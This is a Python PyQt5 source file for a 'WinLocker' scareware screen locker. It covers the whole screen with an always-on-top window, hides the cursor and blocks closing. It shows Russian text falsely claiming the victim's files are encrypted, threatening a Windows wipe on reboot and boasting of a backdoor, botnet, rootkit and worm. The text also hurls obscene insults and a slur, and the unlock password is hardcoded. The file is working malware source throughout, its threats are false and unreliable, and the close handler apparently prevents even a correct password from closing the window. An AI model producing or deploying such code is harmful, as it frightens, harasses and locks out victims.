import sys
import time
import threading
import random
from PyQt5.QtCore import Qt, QTimer
from PyQt5.QtWidgets import QApplication, QWidget, QLabel, QLineEdit, QPushButton, QVBoxLayout

PASSWORD = "1601"
TIMER_SECONDS = 15

class WinLocker(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()
        self.start_timer()
        
    def initUI(self):
        self.setWindowFlags(
            Qt.WindowStaysOnTopHint |
            Qt.FramelessWindowHint |
            Qt.X11BypassWindowManagerHint
        )
        self.setGeometry(0, 0, QApplication.primaryScreen().size().width(), QApplication.primaryScreen().size().height())
        self.setStyleSheet("background-color: black;")
        
        layout = QVBoxLayout()
        layout.setAlignment(Qt.AlignBottom | Qt.AlignLeft)
        
        self.scary_label = QLabel(
            "ВАШИ ДАННЫЕ ЗАШИФРОВАНЫ\n"
            "ПЕРЕЗАГРУЗКА ИЛИ ВЫКЛЮЧЕНИЕ ПК = СНОС WINDOWS\n"
            "ПАРОЛЬ ТЫ НИКОГДА НЕ УЗНАЕШЬ\n"
            "СОСИ ХУЙ\n\n"
            "НО Я НЕ ВЫМОГАТЕЛЬ, Я ДАМ ТЕБЕ ПАРОЛЬ\n"
            "НО НЕ ПРОСТО ПАРОЛЬ, ТЫ ЕГО ДОЛЖЕН РАСШИФРОВАТЬ\n"
            "1 - 5 ПАРОЛИ ВСЕ РАЗНЫЕ СЕТИ\n"
            "МУЧАЙСЯ ПИДОР\n\n"
            "1. standard DES\n$1$rjBkQ1jG$TTNuUVgVfun06nsscdMUV1\n"
            "2. Bcrypt\n$2y$10$XkyocAmlL3rdiz1Uj72MkOpqd.CHCajedThCzis6AL.62OH8lDr/y\n"
            "3. SHA1\n24b378e0bfaf950a0b97c7d36f2d65301286dcf6\n"
            "4. Base64\nNDM1NjM0MjM0\n"
            "5. SHA1\nc93c407d0fb7c60a40b8a2f02b1e4ccf2a9c632d"
        )
        self.scary_label.setStyleSheet("color: white; font-family: Courier; font-size: 14px;")
        layout.addWidget(self.scary_label)
        
        self.dedsek_label = QLabel(
            "DeDsEk тебя приветствует\n"
            "не надо было ничего скачивать\n"
            "из непроверенных источников\n\n"
            "DEDSEK тебя видит\n\n"
            "кстати это еще не один вирус\n"
            "у тебя от меня есть:\n"
            "- Бекдор\n"
            "- Ботнет\n"
            "- Руткит\n"
            "- Червяк такой жирный"
        )
        self.dedsek_label.setStyleSheet("color: white; font-family: Courier; font-size: 16px;")
        self.dedsek_label.setAlignment(Qt.AlignRight | Qt.AlignBottom)
        layout.addWidget(self.dedsek_label)
        
        self.password_label = QLabel("ВВЕДИТЕ ПАРОЛЬ:")
        self.password_label.setStyleSheet("color: white; font-family: Courier; font-size: 28px;")
        self.password_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(self.password_label)
        
        self.password_input = QLineEdit()
        self.password_input.setStyleSheet("color: white; background-color: black; font-family: Courier; font-size: 28px;")
        self.password_input.setEchoMode(QLineEdit.Password)
        layout.addWidget(self.password_input)
        
        self.status_label = QLabel("")
        self.status_label.setStyleSheet("color: white; font-family: Courier; font-size: 20px;")
        self.status_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(self.status_label)
        
        self.setLayout(layout)
        
        self.password_input.returnPressed.connect(self.check_password)
        self.password_input.setFocus()
        
    def check_password(self):
        if self.password_input.text() == PASSWORD:
            self.close()
        else:
            self.status_label.setText("НЕВЕРНЫЙ ПАРОЛЬ!")
            self.password_input.clear()
            
    def start_timer(self):
        self.timer = QTimer()
        self.timer.timeout.connect(self.show)
        self.timer.start(TIMER_SECONDS * 1000)
        
    def closeEvent(self, event):
        event.ignore()

if __name__ == '__main__':
    app = QApplication(sys.argv)
    app.setOverrideCursor(Qt.BlankCursor)
    win = WinLocker()
    app.exec_()
